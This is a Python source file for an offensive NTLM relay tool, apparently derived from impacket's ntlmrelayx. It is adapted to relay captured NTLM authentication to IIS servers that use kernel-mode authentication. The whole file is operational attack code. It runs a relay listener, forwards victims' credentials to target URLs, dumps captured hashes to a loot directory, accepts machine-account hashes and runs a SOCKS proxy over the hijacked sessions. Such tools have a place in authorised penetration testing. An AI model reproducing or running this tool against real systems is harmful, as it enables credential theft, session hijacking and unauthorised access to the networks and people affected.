#!/usr/bin/env python
# IIS Kernel Auth Relay - Standalone NTLM Relay Tool for IIS
#
# This tool is designed specifically for relaying NTLM authentication
# to IIS servers with kernel mode authentication enabled (HTTP.sys).
#
# Features:
# - Session picker HTML UI for multiple relayed sessions
# - Thread-safe socket locking for browser proxy support
# - Kernel auth workaround: try-and-fallback approach for HTTP.sys
# - Keep-alive fixes for raw socket operations
#
# Based on impacket's ntlmrelayx by Fortra, Fox-IT, and Compass Security
# Modified for IIS kernel mode auth attacks

import argparse
import sys
import logging
import cmd
import os

# Add lib directory to Python path for vendored modules
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from urllib.request import ProxyHandler, build_opener, Request
except ImportError:
    from urllib2 import ProxyHandler, build_opener, Request

import json
from time import sleep
from threading import Thread

from impacket import version
from impacket.examples import logger
from impacket.examples.ntlmrelayx.servers import HTTPRelayServer
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS

# Import our vendored modules (with kernel auth support)
from lib.relay.utils.config import NTLMRelayxConfig, parse_listening_ports
from lib.relay.servers.socksserver import SOCKS

RELAY_SERVERS = []


class MiniShell(cmd.Cmd):
    def __init__(self, relayConfig, threads, api_address):
        cmd.Cmd.__init__(self)

        self.prompt = 'nxhttp> '
        self.api_address = api_address
        self.tid = None
        self.relayConfig = relayConfig
        self.intro = 'Type help for list of commands'
        self.relayThreads = threads
        self.serversRunning = True

    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(row[i]) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])

        # Print header
        print(outputFormat.format(*header))
        print('  '.join(['-' * itemLen for itemLen in colLen]))

        # And now the rows
        for row in items:
            print(outputFormat.format(*row))

    def emptyline(self):
        pass

    def do_targets(self, line):
        for url in self.relayConfig.target.originalTargets:
            print(url.geturl())
        return

    def do_socks(self, line):
        headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
        url = "http://{}/ntlmrelayx/api/v1.0/relays".format(self.api_address)
        try:
            proxy_handler = ProxyHandler({})
            opener = build_opener(proxy_handler)
            response = Request(url)
            r = opener.open(response)
            result = r.read()
            items = json.loads(result)
        except Exception as e:
            logging.error("ERROR: %s" % str(e))
        else:
            if len(items) > 0:
                self.printTable(items, header=headers)
            else:
                logging.info('No Relays Available!')

    def do_exit(self, line):
        print("Shutting down, please wait!")
        return True

    def do_EOF(self, line):
        return self.do_exit(line)


def start_servers(options, threads):
    for server in RELAY_SERVERS:
        # Set up config with our vendored NTLMRelayxConfig (has kernelAuth support)
        c = NTLMRelayxConfig()
        c.setProtocolClients(PROTOCOL_CLIENTS)
        c.setRunSocks(options.socks, socksServer)
        c.setTargets(targetSystem)
        c.setDisableMulti(options.no_multirelay)
        c.setKeepRelaying(options.keep_relaying)
        c.setEncoding(codec)
        c.setMode(mode)
        c.setAttacks(PROTOCOL_ATTACKS)
        c.setLootdir(options.lootdir)
        c.setOutputFile(options.output_file)
        c.setdumpHashes(options.dump_hashes)
        c.setIPv6(options.ipv6)
        c.setKernelAuth(options.kernel_auth)
        c.setSMB2Support(options.smb2support)
        c.setInterfaceIp(options.interface_ip)

        # HTTP-specific options
        if server is HTTPRelayServer:
            c.setDomainAccount(options.machine_account, options.machine_hashes, options.domain)
            for port in options.http_port:
                c.setListeningPort(port)
                s = server(c)
                s.start()
                threads.add(s)
                sleep(0.1)
            continue

        s = server(c)
        s.start()
        threads.add(s)
    return c


def stop_servers(threads):
    todelete = []
    for thread in threads:
        if isinstance(thread, tuple(RELAY_SERVERS)):
            thread.server.shutdown()
            todelete.append(thread)
    for thread in todelete:
        threads.remove(thread)
        del thread


# Process command-line arguments
if __name__ == '__main__':
    print("""
  +----------------------------------+
  |  nxhttp - HTTP NTLM Relay Tool   |
  +----------------------------------+
""")

    parser = argparse.ArgumentParser(add_help=False, description="NTLM Relay for IIS with kernel mode auth support")
    parser._optionals.title = "Main options"

    # Main arguments
    parser.add_argument("-h", "--help", action="help", help='show this help message and exit')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-t', "--target", action='store', metavar='TARGET',
                        help="Target URL to relay credentials to (e.g., https://iis-server/)")
    parser.add_argument('-tf', action='store', metavar='TARGETSFILE',
                        help='File with target URLs, one per line')
    parser.add_argument('-w', action='store_true',
                        help='Watch the target file for changes')
    parser.add_argument('-i', '--interactive', action='store_true',
                        help='Launch interactive shell after successful relay')

    # Interface options
    parser.add_argument('-ip', '--interface-ip', action='store', metavar='INTERFACE_IP',
                        help='IP address to bind HTTP server', default='')

    # Server options
    parser.add_argument('--http-port',
                        help='Port(s) for HTTP server (e.g., 80,8000-8010)', default="80")

    # Relay options
    parser.add_argument('--no-multirelay', action="store_true",
                        help='Disable multi-host relay')
    parser.add_argument('--keep-relaying', action="store_true",
                        help='Keep relaying after successful connection')
    parser.add_argument('-ra', '--random', action='store_true',
                        help='Randomize target selection')

    # IIS Kernel Auth - The key feature
    parser.add_argument('--kernel-auth', action='store_true',
                        help='Enable IIS kernel mode auth workaround: probe targets anonymously first')

    # Output options
    parser.add_argument('-l', '--lootdir', action='store', type=str, metavar='LOOTDIR',
                        default='.', help='Directory to store loot (default: current)')
    parser.add_argument('-of', '--output-file', action='store',
                        help='Base filename for captured hashes')
    parser.add_argument('-dh', '--dump-hashes', action='store_true', default=False,
                        help='Show encrypted hashes in console')
    parser.add_argument('-codec', action='store',
                        help='Encoding for target output')

    # SOCKS options
    parser.add_argument('-smb2support', action="store_true", default=False, help='SMB2 Support')
    parser.add_argument('-socks', action='store_true', default=False,
                        help='Launch SOCKS proxy for relayed connections')
    parser.add_argument('-socks-address', default='127.0.0.1',
                        help='SOCKS5 server address')
    parser.add_argument('-socks-port', default=1080, type=int,
                        help='SOCKS5 server port')
    parser.add_argument('-http-api-port', default=9090, type=int,
                        help='SOCKS HTTP API port')
    parser.add_argument('-6', '--ipv6', action='store_true',
                        help='Listen on both IPv6 and IPv4')

    # HTTP options
    httpoptions = parser.add_argument_group("HTTP options")
    httpoptions.add_argument('-machine-account', action='store',
                            help='Domain machine account (domain/machine_name)')
    httpoptions.add_argument('-machine-hashes', action="store", metavar="LMHASH:NTHASH",
                            help='Domain machine hashes')
    httpoptions.add_argument('-domain', action="store",
                            help='Domain FQDN or IP')

    try:
        options = parser.parse_args()
    except Exception as e:
        logging.error(str(e))
        sys.exit(1)

    # Init the logger
    logger.init(options.ts, options.debug)

    if options.codec is not None:
        codec = options.codec
    else:
        codec = sys.getdefaultencoding()

    # Set up target
    if options.target is not None:
        logging.info("Running in relay mode to single host")
        mode = 'RELAY'
        targetSystem = TargetsProcessor(singleTarget=options.target,
                                        protocolClients=PROTOCOL_CLIENTS,
                                        randomize=options.random)
        if targetSystem.generalCandidates:
            options.no_multirelay = True
    else:
        if options.tf is not None:
            logging.info("Running in relay mode to hosts in targetfile")
            targetSystem = TargetsProcessor(targetListFile=options.tf,
                                           protocolClients=PROTOCOL_CLIENTS,
                                           randomize=options.random)
            mode = 'RELAY'
        else:
            logging.info("Running in reflection mode")
            targetSystem = None
            mode = 'REFLECTION'

    # Always use HTTP server
    RELAY_SERVERS.append(HTTPRelayServer)
    try:
        options.http_port = parse_listening_ports(options.http_port)
    except ValueError:
        logging.error("Incorrect port specification for HTTP server")
        sys.exit(1)

    if targetSystem is not None and options.w:
        watchthread = TargetsFileWatcher(targetSystem)
        watchthread.start()

    threads = set()
    socksServer = None
    if options.socks is True:
        # Start our vendored SOCKS proxy (with session picker, kernel auth support)
        socksServer = SOCKS(server_address=(options.socks_address, options.socks_port),
                           api_port=options.http_api_port)
        socksServer.daemon_threads = True
        socks_thread = Thread(target=socksServer.serve_forever)
        socks_thread.daemon = True
        socks_thread.start()
        threads.add(socks_thread)

    c = start_servers(options, threads)

    # Log kernel auth status
    if options.kernel_auth:
        logging.info("IIS Kernel Auth workaround ENABLED - will probe targets anonymously first")
    else:
        logging.info("Kernel Auth workaround disabled - standard relay mode")

    if options.no_multirelay:
        logging.info("Multirelay disabled")
    else:
        logging.info("Multirelay enabled")

    print("")
    logging.info("Servers started, waiting for connections")
    try:
        if options.socks:
            shell = MiniShell(c, threads, api_address='{}:{}'.format(options.socks_address, options.http_api_port))
            shell.cmdloop()
        else:
            sys.stdin.read()
    except KeyboardInterrupt:
        pass

    if options.socks is True:
        socksServer.shutdown()
        del socksServer

    for s in threads:
        del s

    sys.exit(0)
